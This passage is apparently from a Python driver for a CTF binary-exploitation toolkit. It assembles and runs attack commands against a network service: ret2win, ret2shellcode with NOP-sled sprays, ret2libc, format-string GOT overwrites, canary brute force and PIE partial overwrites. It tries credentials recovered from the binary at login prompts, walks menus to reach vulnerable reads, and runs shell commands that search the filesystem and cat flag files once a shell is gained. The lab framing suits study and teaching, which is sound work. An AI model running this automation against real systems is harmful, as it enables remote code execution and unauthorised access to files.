        # No trampoline, but the service prints a stack address: that is the lab's own
        # layout (NOP sled + shellcode in the buffer, return to the buffer's address).
        # Ranked as evidence, because the address is on the wire, not guessed.
        try:
            from ret2shell import stack_addr_in
            leak = stack_addr_in(banner, bits or 32)
        except Exception as exc:
            print(f"[!] BUG while looking for a stack address: {type(exc).__name__}: {exc}")
            leak = None
        if leak is not None:
            sh_cmd = [sys.executable, tool("ret2shell.py"), "--binary", args.binary,
                      "--host", args.host, "--port", str(args.port), "--cmd",
                      "echo ===SHELL===; id; cat flag.txt flag flag* flags/* /home/*/flag* 2>/dev/null"]
            for extra, note in (([], "shellcode in the buffer"),
                                (["--after"], "shellcode after the return address")):
                cands.insert(0, {"shape": f"ret2shellcode at the leaked buffer address ({note})",
                                 "why": f"executable stack + stack address {hex(leak)} printed by the service",
                                 "cmd": sh_cmd + extra, "rank": (0, 0)})
            cands[0], cands[1] = cands[1], cands[0]
    return cands


def arch_of(elf, src):
    return ["--arch", "amd64"] if (elf.get("bits") == 64 or src.get("bits") == 64) else []


def ap_of(args):
    return ([sys.executable, tool("auto_pwn.py"), "--host", args.host, "--port", str(args.port)]
            + (["--binary", args.binary] if args.binary else [])
            + (["--source", args.source] if args.source else [])
            + (["--flag-regex", args.flag_regex] if args.flag_regex else []))


def battery(args, elf, arch, ap):
    """Every technique in the toolkit, as commands. Used when ranking finds nothing or
    everything ranked has failed: the tool should never hand back "I declined to try"."""
    out = []
    try:
        from auto_pwn import paper
        told_addr = [a for a in paper("address") if not (0xF7000000 <= a <= 0xFFFFFFFF or a >= 0x7F0000000000)]
    except Exception:
        told_addr = []
    if told_addr and not args.binary:
        # The paper gives somewhere to return to and there is no binary to say the word
        # size: try both. Offsets come from the notes too (a stated offset, or size + 4/8/..).
        both = [("32-bit", ["--arch", "i386"]), ("64-bit", ["--arch", "amd64"])]
        # The notes usually say which: an address wider than 32 bits (a 0x7ff... stack
        # address beside it), or code at 0x40xxxx - where 64-bit programs are linked, as
        # 32-bit ones are at 0x0804xxxx - means 64-bit, so that attempt goes first.
        try:
            every = paper("address")
        except Exception:
            every = []
        if any(a > 0xFFFFFFFF for a in every) or any(0x400000 <= a <= 0x4FFFFF for a in told_addr):
            both.reverse()
        try:
            import notes as _notes
            offs = _notes.offsets_from(_notes.load())[:4]
        except Exception:
            offs = []
        # An address but no size and no offset in the notes: find the distance on the wire
        # (the length at which the service starts crashing) instead of sweeping up from 8,
        # which never reaches a 200-byte buffer.
        how = [] if offs else ["--crash-oracle"]
        for a_name, a_flag in both:
            out.append((f"ret2win to the address in your notes, {a_name}",
                        ap + ["--goal", "ret2win", "--max-attempts", "60"] + how + a_flag))
        # The other thing an address on the paper can be: a `jmp esp` trampoline, with the
        # shellcode sent right after it (live 5003's shape, with its binary withheld).
        # ret2shell needs one offset per run, so the first few from the notes get a run each.
        sc = []
        for a_name, a_flag in both:
            for o in offs:
                sc.append((f"shellcode behind the jmp esp/rsp in your notes, {a_name}, offset {o}",
                           [sys.executable, tool("ret2shell.py"), "--host", args.host, "--port", str(args.port),
                            "--arch", a_flag[1], "--offset", str(o), "--jmp", hex(told_addr[0]),
                            "--send-mode", "line", "--cmd",
                            "echo ===SHELL===; id; cat flag.txt flag flag* flags/* /home/*/flag* 2>/dev/null"]))
        # If the notes SAY shellcode / jmp esp / executable stack, that reading goes first.
        out = (sc + out) if os.environ.get("CTF_NOTE_WORDS") else (out + sc)
    if not args.binary and not args.source:
        # No files: a variable overwrite needs no offset if the value is sprayed over the
        # whole input, and the value is whatever the service announces (or 1). A handful
        # of connections, so it goes ahead of the slow blind sweeps. It is an ATTEMPT,
        # not evidence - which is why it lives here and not among the ranked candidates,
        # where it would silence the "nothing was ruled in" notice.
        out.append(("var spray (no files: announced value repeated over the input)",
                    ap + ["--goal", "var", "--frame-only"] + arch))
    if not args.binary:
        # A printed stack address and nothing else: the lab's shellcode layout without its
        # offset - the return address is sprayed, the sled comes after. One connection.
        out.append(("ret2shellcode spray (no binary: a printed stack address, no offset)",
                    [sys.executable, tool("ret2shell.py"), "--host", args.host,
                     "--port", str(args.port), "--spray", "--cmd",
                     "echo ===SHELL===; id; cat flag.txt flag flag* flags/* /home/*/flag* 2>/dev/null"]))
    out.insert(0, ("flood (one byte repeated: equalises both sides of a run-time comparison)",
                   ap + ["--goal", "var", "--flood-only"] + arch))
    out += [
        ("ret2win any offset", ap + ["--goal", "auto", "--step", "1",
                                     "--offset-end", "400", "--max-attempts", "400"] + arch),
        ("ret2win crash-oracle", ap + ["--goal", "ret2win", "--crash-oracle"] + arch),
        ("ret2win cyclic", ap + ["--goal", "ret2win", "--cyclic"] + arch),
        ("var any constant", ap + ["--goal", "var"] + arch),
        ("fmt leak", ap + ["--mode", "fmt", "--goal", "fmt-leak"] + arch),
        ("fmt write", ap + ["--mode", "fmt", "--goal", "fmt-write"] + arch),
        ("strcmp", ap + ["--goal", "strcmp"] + arch),
    ]
    if args.binary:
        # Shellcode was ranked-only. If ranking missed it (gadget not detected, NX
        # misread), the exhaustive pass would never try it at all - so "attempts
        # everything" was not true for exec-stack targets. It is now.
        out.append(("ret2shellcode", [sys.executable, tool("ret2shell.py"),
                                      "--binary", args.binary,
                                      "--host", args.host, "--port", str(args.port)]))
        if elf.get("nx") and not elf.get("pie") and (elf.get("plt") or {}).get("puts"):
            out.append(("ret2libc", [sys.executable, tool("ret2libc.py"), args.host,
                                     str(args.port), "--binary", args.binary]))
        if elf.get("pie"):
            out.append(("PIE partial overwrite",
                        ap + ["--goal", "ret2win", "--partial", "--send-mode", "raw"] + arch))
        if elf.get("canary"):
            out.append(("canary brute force",
                        ap + ["--goal", "ret2win", "--brute-canary", "--send-mode", "raw",
                              "--idle", "0.05", "--timeout", "1.0", "--max-attempts", "400"] + arch))
    return [{"shape": f"battery: {n}", "cmd": c,
             "why": "from your notes" if "in your notes" in n else "exhaustive fallback"} for n, c in out]


CRED_PROMPT = re.compile(r"(?:user(?:name)?|login|pass(?:word|code|phrase)?|pin|credentials?)"
                         r"\s*[:>?]\s*$", re.I)
CRED_LIKE = re.compile(r"^[A-Za-z0-9_@#$%!.\-]{3,32}$")
DENIED = re.compile(r"denied|incorrect|invalid|wrong|fail|unauthori[sz]ed|try again|"
                    r"bad (?:user|pass|login)", re.I)


def _last_line(text):
    lines = [ln.strip() for ln in re.split(r"[\r\n]", text) if ln.strip()]
    return lines[-1] if lines else ""


def probe_login(host, port, literals, timeout=3.0, idle=0.5, max_probes=10):
    """Find a credential sequence the service ACCEPTS, using literals from the binary.

    A password check in front of the vulnerable read is the taught strcmp idea composed
    with an overflow: the credentials sit in .rodata. They are tried against the live
    service and only a sequence that visibly gets past the gate is returned, so nothing
    is guessed. Returns [(prompt, reply), ...] or None.
    """
    from auto_pwn import connect, recv_idle
    n = len(literals)
    seqs = [(literals[i], literals[j]) for i in range(n) for j in range(i + 1, n)]
    seqs += [(lit,) for lit in literals]
    seqs += [(literals[j], literals[i]) for i in range(n) for j in range(i + 1, n)]
    for seq in seqs[:max_probes]:
        try:
            s = connect(host, port, timeout)
        except OSError:
            return None
        steps, ok = [], True
        try:
            text = recv_idle(s, timeout, idle).decode("latin-1", "replace")
            for reply in seq:
                prompt = _last_line(text)
                if not CRED_PROMPT.search(prompt):
                    ok = False
                    break
                s.sendall(reply.encode("latin-1", "replace") + b"\n")
                steps.append((prompt, reply))
                text = recv_idle(s, timeout, idle).decode("latin-1", "replace")
                if DENIED.search(text):
                    ok = False
                    break
            if (ok and len(steps) == len(seq) and text.strip()
                    and not CRED_PROMPT.search(_last_line(text))):
                return steps
        except OSError:
            pass
        finally:
            s.close()
    return None


def with_login_paths(args, cands, banner, top=3):
    """Wrap the best exploit candidates in a login walk - but only when credentials
    recovered from the binary were actually ACCEPTED by the service. A 'password:' prompt
    that is itself the vulnerable read yields no accepted sequence and is left alone."""
    if not args.binary:
        return []
    text = (banner or b"").decode("latin-1", "replace")
    if not CRED_PROMPT.search(_last_line(text)):
        return []
    try:
        from auto_pwn import strcmp_literals
        lits = [l for l in strcmp_literals(args.binary)
                if CRED_LIKE.match(l) and "flag" not in l.lower()][:5]
    except Exception as exc:
        print(f"[!] BUG while reading credential literals: {type(exc).__name__}: {exc}")
        return []
    if not lits:
        return []
    steps = probe_login(args.host, args.port, lits)
    if not steps:
        return []
    talk = []
    for prompt, reply in steps:
        talk += ["--talk", f"{prompt if '=' not in prompt else ''}={reply}"]
    talk += ["--talk", "=PAYLOAD", "--max-attempts", "12"]
    out = []
    for c in cands:
        cmd = c.get("cmd") or []
        if c.get("shell") or "--talk" in cmd or not any("auto_pwn.py" in x for x in cmd):
            continue
        out.append({"shape": f"{c['shape']} after login",
                    "why": "credentials from .rodata were ACCEPTED by the service: "
                           + " / ".join(r for _p, r in steps),
                    "cmd": cmd + talk})
        if len(out) >= top:
            break
    return out


PROMPTISH = re.compile(r"[:>?]\s*$")


def _benign_for(prompt):
    """A harmless reply for a prompt: a digit where a number is plainly wanted."""
    return "1" if re.search(r"number|how many|age|size|length|count|\d", prompt, re.I) else "x"


def probe_path(args, creds, timeout=3.0, idle=0.5, max_depth=5):
    """Walk the service to the DEEPEST distinct prompt and record how we got there.

    One walk instead of two competing ones. Credential prompts are answered with the
    sequence `probe_login` already proved the service accepts; every other prompt gets a
    harmless line. This is what lets a login gate and a later read compose - previously
    each wrapper wrapped the candidate list on its own and skipped anything that already
    carried --talk, so the payload could go behind the login OR at read #2, never both.

    Returns ([(prompt, reply), ...], final_prompt): the benign steps to walk, and the
    prompt the payload should be aimed at. ([], "") for a plain single-read service.
    """
    from auto_pwn import connect, recv_idle
    cred_replies = [r for _p, r in (creds or [])]
    try:
        s = connect(args.host, args.port, timeout)
    except OSError:
        return [], ""
    steps, final = [], ""
    try:
        text = recv_idle(s, timeout, idle).decode("latin-1", "replace")
        cur = _last_line(text)
        seen = {cur}
        for _ in range(max_depth):
            if CRED_PROMPT.search(cur) and cred_replies:
                reply = cred_replies.pop(0)
            else:
                reply = _benign_for(cur)
            try:
                s.sendall(reply.encode("latin-1", "replace") + b"\n")
            except OSError:
                break
            fresh = recv_idle(s, timeout, idle).decode("latin-1", "replace")
            nxt = _last_line(fresh)
            if DENIED.search(fresh):
                break                      # the walk went wrong; do not trust it
            if (not fresh.strip() or not PROMPTISH.search(nxt) or len(nxt) > 60
                    or nxt in seen):
                break                      # a repeat is a loop, not a new read
            steps.append((cur, reply))
            seen.add(nxt)
            cur = final = nxt
    except OSError:
        pass
    finally:
        s.close()
    return steps, final


LAST_PATH = {}
DIAGNOSES = []        # "[!] DIAGNOSIS: ..." blocks from child tools, repeated at the end


def with_prompt_path(args, cands, banner, top=4):
    """Aim the payload at the deepest prompt the service reaches, walking whatever stands
    in front of it - a login, a safe first read, or both."""
    creds = None
    try:
        from auto_pwn import paper
        told_words = [t for t in paper("text") if isinstance(t, str)]
    except Exception:
        told_words = []
    if args.binary or told_words:
        text = (banner or b"").decode("latin-1", "replace")
        if CRED_PROMPT.search(_last_line(text)):
            try:
                from auto_pwn import strcmp_literals
                # words from the paper first and unfiltered (a pass phrase may have a
                # space in it); literals from the binary after, filtered as before
                lits = told_words[:4] + [l for l in (strcmp_literals(args.binary) if args.binary else [])
                                         if l not in told_words and CRED_LIKE.match(l)
                                         and "flag" not in l.lower()][:5]
            except Exception as exc:
                print(f"[!] BUG while reading credential literals: {type(exc).__name__}: {exc}")
                lits = []
            if lits:
                creds = probe_login(args.host, args.port, lits)
                if creds:
                    print("[*] login gate passed with credentials from the binary or your notes: "
                          + " / ".join(r for _p, r in creds))
            if not creds:
                d = ("[!] DIAGNOSIS: the service asks for a login (" + repr(_last_line(text).strip()[:40]) + ") and "
                     "nothing found in the binary, the banner or your notes is accepted.\n"
                     "[!] The password has to come from somewhere else: the question paper, another "
                     "question's answer, or a file you were given.\n"
                     "[!] When you have it: run  python3 go.py  again and type it as notes, e.g.  "
                     "password: hunter2\n"
                     "[!] Also worth 30 seconds by hand: type %p.%p.%p at the prompt (if hex comes back, "
                     "the login itself leaks), and a very long line (if it crashes, the login overflows).")
                if d.split("\n")[0] not in [x.split("\n")[0] for x in DIAGNOSES]:
                    DIAGNOSES.append(d)
    steps, final = probe_path(args, creds)
    LAST_PATH["steps"] = steps or []
    LAST_PATH["login"] = bool(creds)
    if not steps:
        return []
    print(f"[*] walking {len(steps)} prompt(s) and aiming the payload at {final!r}")
    out = []
    for c in cands:
        cmd = c.get("cmd") or []
        if c.get("shell") or "--talk" in cmd or not any("auto_pwn.py" in x for x in cmd):
            continue
        talk = []
        for prompt, reply in steps:
            talk += ["--talk", f"{prompt if '=' not in prompt else ''}={reply}"]
        # 12 is enough when analysis put the right offset first; a size from the notes
        # yields a longer list (size+4 ... size+96), so those attempts get room for it.
        talk += ["--talk", f"{final if '=' not in final else ''}=PAYLOAD",
                 "--max-attempts", "90" if "in your notes" in c.get("shape", "") else "12"]
        label = "after login" if creds else f"at read #{len(steps) + 1}"
        if creds and len(steps) > len(creds):
            label = f"after login, at read #{len(steps) - len(creds) + 2}"
        out.append({"shape": f"{c['shape']} {label}",
                    "why": f"payload aimed at {final!r} after {len(steps)} prompt(s)",
                    "cmd": cmd + talk})
        if len(out) >= top:
            break
    # Shellcode at a buffer address the service prints only AFTER the first answer: the
    # ranked list never proposed it, because the address was not in the first banner.
    # ret2shell.py finds the address itself once it has answered the earlier prompts.
    try:
        from elftool import ELF
        _rep = ELF(args.binary).report() if args.binary else {}
    except Exception:
        _rep = {}
    if _rep.get("nx") is False and not (_rep.get("win_symbols") or {}):
        pre = []
        for _p, reply in steps:
            pre += ["--pre", reply]
        for off in list(_rep.get("ret_offset_candidates") or [])[:3][::-1]:
            # first: with no win() to return to, the ret2win attempts above cannot land
            out.insert(0, {"shape": f"ret2shellcode at read #{len(steps) + 1}, offset {off}",
                        "why": "executable stack, and the service reads again after a harmless line",
                        "cmd": [sys.executable, tool("ret2shell.py"), "--binary", args.binary,
                                "--host", args.host, "--port", str(args.port), "--offset", str(off),
                                "--cmd", "echo ===SHELL===; id; cat flag.txt flag flag* flags/* "
                                         "/home/*/flag* 2>/dev/null"] + pre})
    # No files at all: the address spray (no offset needed) - but aimed past the earlier
    # prompts, because the buffer address may only be printed after they are answered.
    # One connection; it stops by itself when no stack address is ever printed.
    if not args.binary and not args.source:
        pre = []
        for _p, reply in steps:
            pre += ["--pre", reply]
        out.insert(0, {"shape": f"ret2shellcode spray at read #{len(steps) + 1}",
                       "why": "no files: a stack address printed after the earlier prompt(s), sprayed as "
                              "the return address",
                       "cmd": [sys.executable, tool("ret2shell.py"), "--host", args.host,
                               "--port", str(args.port), "--spray", "--cmd",
                               "echo ===SHELL===; id; cat flag.txt flag flag* flags/* "
                               "/home/*/flag* 2>/dev/null"] + pre})
    # A `jmp esp` address from the NOTES (no binary): the same shellcode attempts, but
    # sent after the earlier prompts are answered.
    pre = []
    for _p, reply in steps:
        pre += ["--pre", reply]
    walked = []
    for c in cands:
        cmd = c.get("cmd") or []
        if any("ret2shell.py" in x for x in cmd) and "--jmp" in cmd and "--pre" not in cmd:
            walked.append({"shape": f"{c['shape']} at read #{len(steps) + 1}",
                           "why": "the jmp esp/rsp from your notes, after the earlier prompt(s)",
                           "cmd": cmd + pre})
    # Without the words (jmp esp / shellcode / executable) in the notes, an address is far
    # more likely a win(): the shellcode reading keeps its turn at the first prompt only.
    if os.environ.get("CTF_NOTE_WORDS"):
        out = walked[:8] + out
    # ret2libc speaks --pre, not --talk, so the loop above skips it. Same question, asked
    # of it: a harmless prompt first, and the overflow in the frame's second buffer.
    for c in cands:
        cmd = c.get("cmd") or []
        if not any("ret2libc.py" in x for x in cmd) or "--pre" in cmd:
            continue
        try:
            from elftool import ELF
            offs = list(ELF(args.binary).report().get("ret_offset_candidates") or [])[:3]
        except Exception:
            offs = []
        for depth in (len(steps),):
            pre = []
            for _p, reply in steps[:depth]:
                pre += ["--pre", reply]
            for off in offs or [None]:
                out.append({"shape": f"{c['shape']} at read #{depth + 1}" + (f", offset {off}" if off else ""),
                            "why": "the service reads again after a harmless line; ret2libc answers it "
                                   "before both stages",
                            "cmd": cmd + pre + (["--offset", str(off)] if off else [])})
        break
    return out


def probe_reads(host, port, timeout=3.0, idle=0.5, max_depth=3):
    """Does the service read AGAIN after a harmless line - and show a different prompt?

    "Enter your name:" then "Enter your message:" is the commonest lab layout, and the
    overflow is as often on the second read as the first. One connection, one benign line
    per prompt; each NEW prompt that appears is recorded. A prompt that merely repeats is
    a loop, not a new read, and ends the probe. Returns [(prompt_before, reply), ...] for
    the benign steps plus the final prompt reached, or ([], "") for a single-read service.
    """
    from auto_pwn import connect, recv_idle
    try:
        s = connect(host, port, timeout)
    except OSError:
        return [], ""
    steps, final = [], ""
    try:
        text = recv_idle(s, timeout, idle).decode("latin-1", "replace")
        cur = _last_line(text)
        seen = {cur}
        for _ in range(max_depth):
            reply = _benign_for(cur)
            try:
                s.sendall(reply.encode() + b"\n")
            except OSError:
                break
            fresh = recv_idle(s, timeout, idle).decode("latin-1", "replace")
            nxt = _last_line(fresh)
            if (not fresh.strip() or not PROMPTISH.search(nxt) or len(nxt) > 60
                    or nxt in seen):
                break
            steps.append((cur, reply))
            seen.add(nxt)
            cur = final = nxt
    except OSError:
        pass
    finally:
        s.close()
    return steps, final


def with_second_read_paths(args, cands, top=2):
    """Also aim the payload at a LATER read, when the probe shows one exists."""
    steps, final = probe_reads(args.host, args.port)
    if not steps:
        return []
    out = []
    for c in cands:
        cmd = c.get("cmd") or []
        if c.get("shell") or "--talk" in cmd or not any("auto_pwn.py" in x for x in cmd):
            continue
        for depth in range(1, len(steps) + 1):
            talk = []
            for prompt, reply in steps[:depth]:
                talk += ["--talk", f"{prompt if '=' not in prompt else ''}={reply}"]
            nxt = steps[depth][0] if depth < len(steps) else final
            talk += ["--talk", f"{nxt if '=' not in nxt else ''}=PAYLOAD", "--max-attempts", "8"]
            out.append({"shape": f"{c['shape']} at read #{depth + 1}",
                        "why": f"the service reads again after a harmless line: {nxt!r}",
                        "cmd": cmd + talk})
        if len({o['shape'].split(' at read')[0] for o in out}) >= top:
            break
    return out


def with_menu_paths(cands, banner, limit=4, top=3):
    """Wrap each candidate in a scripted menu walk. We still never *guess* which option
    is right - we try them, which is what 'attempt' means."""
    text = (banner or b"").decode("latin-1", "replace")
    prompts = [ln.strip() for ln in re.split(r"[\r\n]", text)
               if ln.strip().endswith((":", ">", "?")) and len(ln.strip()) <= 60]
    if not prompts:
        return cands
    prompt = prompts[-1]
    # Candidate-major: the best technique gets tried against every menu option before
    # we move on. Option-major buries the right pairing behind the whole candidate list.
    out = []
    # Include canary/PIE candidates in the walk: on menucanary32 the secret appears only
    # inside an option, so the ranked candidate has to be menu-wrapped too. Without this
    # the flag is found only by the exhaustive battery.
    ranked = [c for c in cands if c.get("rank", (9, 0))[0] == 0][:top]
    rest = [c for c in cands if c not in ranked][:max(0, top - len(ranked))]
    for c in (ranked + rest) or cands[:top]:
        if c.get("shell") or not c.get("cmd"):
            continue
        # Only auto_pwn.py understands --talk. Wrapping fmtwrite.py / ret2libc.py /
        # ret2shell.py in a menu walk produced candidates that cannot work and cost a
        # full cap each: menulibc32 burned four 25s slots on "ret2libc via menu option N"
        # before reaching the --pre variants that do the job. Those tools get --pre
        # candidates built for them instead.
        if not any("auto_pwn.py" in x for x in c["cmd"]):
            continue
        known = FMT_PRE.get("pre")
        opts = list(range(1, limit + 1))
        if known and known.isdigit() and int(known) in opts:
            opts = [int(known)] + [o for o in opts if o != int(known)]
        for opt in opts:
            # Cap attempts hard on menu walks. If the option is WRONG the payload never
            # reaches a vulnerable read, so every offset tried is wasted - a wrong option
            # was burning a full 25s slice each. If the option is RIGHT, the frame-derived
            # offset is first in the list and it lands within a couple of tries.
            out.append({"shape": f"{c['shape']} via menu option {opt}",
                        "why": f"scripted walk: {prompt} -> {opt}",
                        "cmd": c["cmd"] + ["--talk", f"{prompt}={opt}", "--talk", "=PAYLOAD",
                                           "--max-attempts", "12"]})
    return out


def low_confidence(args, elf, src, cands):
    if elf.get("pie") and not any(c["shape"].startswith("ret2win") for c in cands):
        return "binary is PIE and nothing leaked a code address to rebase from"
    if elf.get("canary") and not any("canary" in c["shape"] for c in cands):
        return "stack canary present and nothing leaked it; a plain overwrite will abort"
    if not cands:
        if not args.binary and not args.source:
            return ("no --binary/--source, and the service gave no usable evidence "
                    "(no format-string bug, no code address in the banner)")
        return "no taught shape matched the evidence"
    return None


# ---------------------------------------------------------------- shell candidate
def run_shell(args, tr, budget):
    """verify.py to detect a build shift, then ret2shell.py. Per the RUNBOOK: if verify
    is inconclusive, try shift 0 ONCE and then hand over a manual template - no sweep."""
    t0 = time.time()
    rc, out = run_tool([sys.executable, tool("verify.py"), "--binary", args.binary,
                        "--host", args.host, "--port", str(args.port)],
                       min(budget, 45), tr)
    m = re.search(r"exploit-shift\s+(-?0x[0-9a-fA-F]+)", out)
    shift = m.group(1) if m else None
    same = "remote binary == local binary" in out
    # Once a shell lands, look for flag-ish files generically: cwd and one level down.
    # No challenge-specific path and no flag value - just a search, like `ls` by hand.
    # cwd globs are not enough: live Echo32 keeps the flag at /home/ctf/flag.txt while
    # the cwd holds only the binary. Fall back to a bounded filesystem search.
    hunt = ("echo ===SHELL===; id; "
            "cat ./*flag*/* ./*flag* ./*/*flag* 2>/dev/null; "
            "cat $(find / -maxdepth 4 -iname '*flag*' -type f "
            "-not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -5) 2>/dev/null; "
            "ls -1a . 2>/dev/null | head -20")
    cmd = [sys.executable, tool("ret2shell.py"), "--binary", args.binary,
           "--host", args.host, "--port", str(args.port), "--cmd", hunt]
    if shift:
        print(f"[*] verify: remote build shifted by {shift}")
        cmd.append(f"--shift={shift}")
    elif same:
        print("[*] verify: same build as local; no shift needed")
    else:
        print("[*] verify inconclusive -> trying shift 0 once (RUNBOOK fallback)")
    remaining = budget - (time.time() - t0)
    rc, out = run_tool(cmd, max(5.0, remaining), tr)
    sys.stdout.write(out)
    if rc == 0:
        return 0
    # Two assumptions were just made: that the overflow is the FIRST read, and that it is
    # in the first buffer the frame analysis listed. "Name:" (harmless) then "Message:"
    # (the overflow) breaks both. Walk the prompts the service really shows, and give
    # each frame offset a go at each.
    try:
        from elftool import ELF
        offs = list(ELF(args.binary).report().get("ret_offset_candidates") or [])[:3]
        steps, _final = probe_reads(args.host, args.port)
    except Exception as exc:
        print(f"[!] BUG while re-aiming the shellcode: {type(exc).__name__}: {exc}")
        offs, steps = [], []
    paths = [[r for _p, r in steps[:d]] for d in range(len(steps), 0, -1)]
    tries = [(p, o) for p in paths for o in offs] + [([], o) for o in offs[1:]]
    for pre, off in tries[:8]:
        left = budget - (time.time() - t0)
        if left < 4:
            break
        print(f"[*] shellcode again: offset {off}"
              + (f", after answering {len(pre)} earlier prompt(s)" if pre else ", at the first read"))
        extra = ["--offset", str(off)]
        for line in pre:
            extra += ["--pre", line]
        rc, out = run_tool(cmd + extra, min(left, 12.0), tr)
        if rc == 0:
            sys.stdout.write(out)
            return 0
    if not shift and not same:
        print_shift_fallback(args)
    return 2


def print_shift_fallback(args):
    print("\n--- manual fallback (RUNBOOK 2): verify could not pin the shift ---")
    print("A build shift moves whole functions by a multiple of 16, so a few tries cover it:")
    for s in ("-0x10", "-0x20", "+0x10", "+0x20"):
        print(f"  python3 {tool('ret2shell.py')} --binary {args.binary} "
              f"--host {args.host} --port {args.port} --shift={s}")
    print(f"  python3 {tool('verify.py')} --binary {args.binary} "
          f"--host {args.host} --port {args.port} --read 0x<ADDR>   # eyeball one function")


# ---------------------------------------------------------------- templates
def why_nothing_applies(elf, fmt_yes, magics):
    """One line per taught technique saying exactly what rules it out. Printed when no
    shape matched, so a refusal is a reasoned conclusion rather than a dead end."""
    out = []
    bits = elf.get("bits")
    gadget = (elf.get("gadgets") or {}).get("jmp esp" if bits == 32 else "jmp rsp")
    if elf.get("win_symbols"):
        out.append("  ret2win       : a win-like symbol EXISTS - but PIE/canary blocks the jump")
    else:
        out.append("  ret2win       : ruled out - the binary has no win/flag/shell symbol to jump to")
    if elf.get("nx"):
        out.append("  ret2shellcode : ruled out - NX is ON, code on the stack will not execute")
    elif not gadget:
        out.append("  ret2shellcode : stack is executable, but no jmp esp/rsp gadget was found")
    if not magics:
        out.append("  var/struct    : ruled out - no non-pointer guard constant to overwrite")
    if fmt_yes is False:
        out.append("  format string : ruled out - the service echoed %p literally instead of leaking")
    elif fmt_yes is None:
        out.append("  format string : not tested (no probe was sent)")
    return out


def suggest_talk(args, banner):
    """Turn the observed prompts into a --talk chain for the human to confirm.

    We refuse to auto-navigate, but refusing without telling you HOW to proceed just
    moves the problem. The prompts are right there in the banner; name them."""
    text = (banner or b"").decode("latin-1", "replace")
    prompts = [ln.strip() for ln in re.split(r"[\r\n]", text)
               if ln.strip().endswith((":", ">", "?")) and len(ln.strip()) <= 60]
    if not prompts:
        return ""
    base = (f"python3 {tool('auto_pwn.py')} --host {args.host} --port {args.port} "
            + (f"--binary {args.binary} " if args.binary else "") + "--goal auto")
    if len(prompts) == 1:
        # Only the first prompt is visible; the vulnerable one appears after choosing.
        chain = (f"--talk '{prompts[0]}=CHOICE' --talk 'NEXT_PROMPT:=PAYLOAD'")
        note = ["  CHOICE      = the menu option that reaches the vulnerable input",
                "  NEXT_PROMPT = whatever it asks AFTER that choice (connect once by hand to see it)"]
    else:
        chain = " ".join(f"--talk '{p}=CHOICE'" for p in prompts[:-1]) + \
                f" --talk '{prompts[-1]}=PAYLOAD'"
        note = ["  Replace each CHOICE with the menu option that leads to the input."]
    return "\n".join(["", "SUGGESTED CONVERSATION (you choose the menu path; it does the exploit):",
                      f"  prompts seen: {', '.join(repr(p) for p in prompts)}",
                      f"  {base} {chain}"] + note)


def targeted_write_hint(args, elf, fmt_yes, src):
    """A format-string bug plus a writable GOT is the Lab 10 GOT->system case, and
    --goal fmt-write cannot do it (it only probes blindly). Hand over the real command
    with the actual GOT address already filled in."""
    got = elf.get("got") or {}
    if not got or elf.get("relro") == "full":
        return ""
    if not (fmt_yes or "fmt" in (src.get("class") or "")):
        return ""
    tgt = got.get("puts") or got.get("printf") or sorted(got.values())[0]
    fp = f"python3 {tool('fmtpwn.py')} {args.host} {args.port}" + \
         (f" --binary {args.binary}" if args.binary else "")
    return ("\nTARGETED FORMAT-STRING WRITE - by hand, only if the automatic run does not get there:\n"
            f"  {fp} --goal dump                       # look at the stack words\n"
            f"  {fp} --goal read  --addr {hex(tgt)}      # what is at an address (here: a GOT slot)\n"
            f"  {fp} --goal write --addr 0xADDR --value 0xVALUE\n"
            "  The GOT is writable, so pointing an entry at win()/system() is on the table -\n"
            "  `--goal got` and `--goal gotsys` do that without any address typed.\n"
            "  Add --pre LINE for each input that comes before the format string.\n")


def print_template(args, reason, elf, src, banner, cands, fmt_yes=None, magics=None):
    tried = "every ranked candidate failed" in reason
    # Never the word SOLVED on a failure line: the eye (and every negative test) matches it.
    print(f"\n[!] {'NO FLAG' if tried else 'LOW CONFIDENCE'}: {reason}")
    print("[!] " + ("Every technique was tried." if tried else "solve.py will not guess.")
          + " Here is what is known and what is missing.\n")
    print("KNOWN")
    if args.binary and elf:
        print(f"  binary {args.binary}: {elf.get('bits')}-bit pie={elf.get('pie')} nx={elf.get('nx')} "
              f"canary={elf.get('canary')} relro={elf.get('relro')}")
        if elf.get("win_symbols"):
            print("  win-like symbols: " + ", ".join(sorted(elf["win_symbols"])))
        if elf.get("ret_offset_candidates"):
            print("  RET offset candidates: " + ", ".join(map(str, elf["ret_offset_candidates"][:8])))
    if args.source and src:
        print(f"  source {args.source}: class={src.get('class')}")
    if banner:
        first = banner.decode("latin-1", "replace").strip().splitlines()[:3]
        print("  banner: " + " | ".join(line.strip() for line in first))
    if not args.binary:
        print("  (no --binary: protections, symbols and offsets are unknown)")
    print("\nMISSING -> supply one of these and re-run")
    if not args.binary:
        print("  --binary PATH     protections, win symbol, offsets, gadgets")
    if not args.source:
        print("  --source PATH     bug class, guard constants, strcmp literals")
    if args.binary and args.source:
        print("  nothing: both a binary and a source were supplied, and the evidence in")
        print("  them still does not match a taught shape. Re-read the verdict above -")
        print("  a refusal can be the correct answer (see RUNBOOK 1 and 2).")
    # Only ever suggest commands the evidence supports. Offering `--goal ret2win` for a
    # binary with no win symbol sends you down a dead end with a blank you cannot fill.
    where = (f"--binary {args.binary} " if args.binary else "") + \
            (f"--source {args.source} " if args.source else "")
    ap_cmd = f"python3 {tool('auto_pwn.py')} --host {args.host} --port {args.port} {where}"

    print(targeted_write_hint(args, elf, fmt_yes, src or {}), end="")
    if cands:
        print("\nRANKED CANDIDATES - ALL TRIED (each already ran and failed; here to re-run by hand):"
              if "every ranked candidate failed" in reason else
              "\nRANKED CANDIDATES (not run) - run one of these by hand:")
        for i, c in enumerate(cands, 1):
            print(f"  {i}. {c['shape']}: {c['why']}")
            if c.get("shell"):
                print(f"     python3 {tool('verify.py')} --binary {args.binary} "
                      f"--host {args.host} --port {args.port}")
                print(f"     python3 {tool('ret2shell.py')} --binary {args.binary} "
                      f"--host {args.host} --port {args.port}")
            else:
                print("     " + shlex.join(c["cmd"]))
    elif args.binary and elf:
        print("\nWHY NO TAUGHT TECHNIQUE APPLIES")
        for line in why_nothing_applies(elf, fmt_yes, magics):
            print(line)
        print("\n  => Nothing the module taught fits this target. The correct answer is to")
        print("     RECORD A REFUSAL and move on - say what ruled each technique out.")
        print("     Do not keep trying: there is no blank here you could fill in to win.")
    else:
        print("\nMANUAL NEXT STEPS (replace CAPITALISED words; see RUNBOOK.md)")
        print(f"  python3 {tool('elftool.py')} PATH_TO_BINARY     # get the binary if you can")
